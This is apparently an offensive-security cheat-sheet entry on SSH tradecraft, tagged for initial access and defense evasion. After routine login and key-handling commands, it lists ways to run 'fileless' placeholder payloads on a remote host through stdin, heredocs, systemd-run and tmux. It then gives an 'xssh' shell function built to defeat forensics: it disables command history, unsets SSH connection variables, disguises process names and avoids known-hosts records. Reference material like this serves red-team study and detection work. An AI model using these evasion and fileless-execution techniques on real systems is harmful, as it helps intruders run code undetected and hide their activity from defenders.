---
author(s):
  - Userware
tags:
  - initial-access
  - exploitation
  - defense-evasion
  - staying-off-the-land
  - living-off-the-foreign-land
  - T1021-004
  - network-ports
  - ssh
  - cross-platform
---
# Unix Shell

## 01 - Authenticating via Password

```
$ ssh [-oHostKeyAlgorithms=+ssh-rsa] [-p <PORT>] <username>@<IP>

$ ssh [-oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-cbc] [-p <PORT>] <username>@<IP>
```

## 02 - Authenticating via SSH Key

Alter the SSH private key with proper permissions.

```
$ chmod 600 /path/to/key
```

Then authenticate to establish connection.

```
$ ssh -i /path/to/ssh_key [-oHostKeyAlgorithms=+ssh-rsa] <username>@<IP>
```

To convert `.ppk` files into `.pem`.

```
$ sudo apt install -y putty-tools

$ puttygen file.ppk -O private-openssh -o file.pem
```

## 03 - Multiple Remote Shells

Instead of passing the credentials repeatedly. Creating a **master connection** (`-M`) with a **control socket** (`-S`) will make it easier.

```
$ ssh -MS .sshmux <username>@<IP>
```

To re-authenticate without the credentials. Just specify the path of the **control socket**.

```
$ ssh -S .sshmux NONE
```

## 04 - Fileless Malware

```
$ ssh [-p <PORT>] <username>@<IP> < payload.sh
```

Force read to STDIN.

```
$ ssh [-p <PORT>] <username>@<IP> 'bash -s' < payload.sh
```

Execute payload with **heredocs**.

```
$ ssh [-p <PORT>] <username>@<IP> << EOF
<payload>
EOF
```

Execute payload through file descriptor.

```
$ ssh [-p <PORT>] <username>@<IP> 'bash /proc/self/fd/0' < payload.sh
```

Execute payload through `systemd-run`.

```
$ ssh [-p <PORT>] <username>@<IP> 'systemd-run --user -P bash' < payload.sh
```

Execute payload through a multiplexer.

> [!INFO]
> You won't see any output when executing payloads.

```
$ cat payload.sh | ssh [-p <PORT>] <username>@<IP> 'tmux send-keys -t 0 "$(cat)" Enter'
```

## 05 - OPSEC Consideration

When adding `UserKnownHostsFile=/dev/null` it won't reveal the user activity when someone's running `w` command.

```
$ ssh -o UserKnownHostsFile=/dev/null -T <username>@<IP>

$ ssh -o UserKnownHostsFile=/dev/null -T <username>@<IP> "/bin/bash -i"
```

This shell script function also provides with PTY and colors with most anti-forensics features to terminate the established connection.

```bash
xssh() {
    local ttyp="$(stty -g)"
    stty raw -echo icrnl opost
    [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
    ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}
```

The usage of this shell function as it follows.

```
$ xssh [-p <PORT>] <username>@<IP>
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)